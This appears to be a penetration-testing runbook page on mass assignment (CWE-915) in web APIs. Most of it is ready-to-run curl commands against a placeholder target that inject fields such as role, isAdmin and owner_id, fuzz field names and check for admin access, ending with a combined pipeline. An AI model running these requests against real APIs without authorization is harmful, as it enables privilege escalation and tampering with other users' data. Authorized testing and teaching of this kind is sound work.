---
title: "Mass Assignment (CWE-915)"
description: "Add unexpected fields to create/update requests to modify privileges, ownership, or internal state."
phase: Web
order: 50
tags:
  - mass-assignment
  - api
  - authorization
  - cwe-915
tools:
  - curl
  - jq
  - burp suite
updated: 2026-10-01
---

A runbook for **mass assignment / object injection** in an authorized scope. Goal: prove that adding fields the UI never sends can change privileges, ownership, or internal state, and verify it with a read-back.

## 1. Find the bindable object

Identify create/update endpoints: profile edits, signup, settings, invitations. Capture the normal request fields.

```bash
curl -s https://target/api/profile -H 'Authorization: Bearer <token>' | jq
curl -s https://target/api/profile -X PUT -H 'Authorization: Bearer <token>' \
  -H 'Content-Type: application/json' --data '{"email":"me@example.com"}' | jq
```

## 2. Baseline the read-back

Record the current state so you can detect any change you cause.

```bash
curl -s https://target/api/profile -H 'Authorization: Bearer <token>' | jq '.' > before.json
cat before.json
```

## 3. Inject privileged fields

Add properties the client never sends and look for a changed result.

```bash
curl -s https://target/api/profile -X PUT -H 'Authorization: Bearer <token>' \
  -H 'Content-Type: application/json' \
  --data '{"email":"me@example.com","role":"admin","isAdmin":true,"verified":true}' | jq
```

Common targets: `role`, `is_admin`, `verified`, `email_verified`, `balance`, `credit`, `owner_id`, `tenant_id`, `status`, `permissions`.

## 4. Nested and related objects

Binding often recurses. Nest a privileged object inside an allowed one.

```bash
curl -s https://target/api/org -X POST -H 'Authorization: Bearer <token>' \
  -H 'Content-Type: application/json' \
  --data '{"name":"x","organization":{"plan":"enterprise","role":"owner"}}' | jq
curl -s https://target/api/profile -X PUT -H 'Authorization: Bearer <token>' \
  -H 'Content-Type: application/json' --data '{"owner_id":1,"account_id":1}' | jq
```

## 5. Probe the field set

Fuzz candidate field names against the update endpoint and diff responses.

```bash
for f in role isAdmin admin verified email_verified active approved balance credit owner_id tenant_id permissions status; do
  curl -s -o /dev/null -w "$f %{http_code}\n" https://target/api/profile -X PUT \
    -H 'Authorization: Bearer <token>' -H 'Content-Type: application/json' \
    --data "{\"email\":\"me@example.com\",\"$f\":\"x\"}"
done
```

## 6. Verify with read-back

Fetch the object again and confirm the field actually changed and affects behavior.

```bash
curl -s https://target/api/profile -H 'Authorization: Bearer <token>' | jq '.' > after.json
diff <(jq -S . before.json) <(jq -S . after.json)
curl -s https://target/api/admin -H 'Authorization: Bearer <token>' -o /dev/null -w 'admin access: %{http_code}\n'
```

## 7. Full pipeline (one block)

```bash
TARGET=https://target
T="Authorization: Bearer <token>"
# baseline
curl -s "$TARGET/api/profile" -H "$T" | jq '.' | tee before.json
# single-field injection
curl -s "$TARGET/api/profile" -X PUT -H "$T" -H 'Content-Type: application/json' \
  --data '{"email":"me@example.com","role":"admin","isAdmin":true,"verified":true}' | jq
# nested object injection
curl -s "$TARGET/api/org" -X POST -H "$T" -H 'Content-Type: application/json' \
  --data '{"name":"x","organization":{"plan":"enterprise","role":"owner"}}' | jq
# field fuzz
for f in role isAdmin verified active balance owner_id tenant_id permissions status; do
  curl -s -o /dev/null -w "$f %{http_code}\n" "$TARGET/api/profile" -X PUT -H "$T" \
    -H 'Content-Type: application/json' --data "{\"email\":\"me@example.com\",\"$f\":\"x\"}"
done
# read-back verification
curl -s "$TARGET/api/profile" -H "$T" | jq '.' | tee after.json
diff <(jq -S . before.json) <(jq -S . after.json)
curl -s -o /dev/null -w 'admin access: %{http_code}\n' "$TARGET/api/admin" -H "$T"
```

## Ethics & legality

- Only test APIs in an official scope or with written authorization.
- Modify only your own test accounts; never change another user's privileges.
- Prove the change with read-back and document the exact fields accepted.
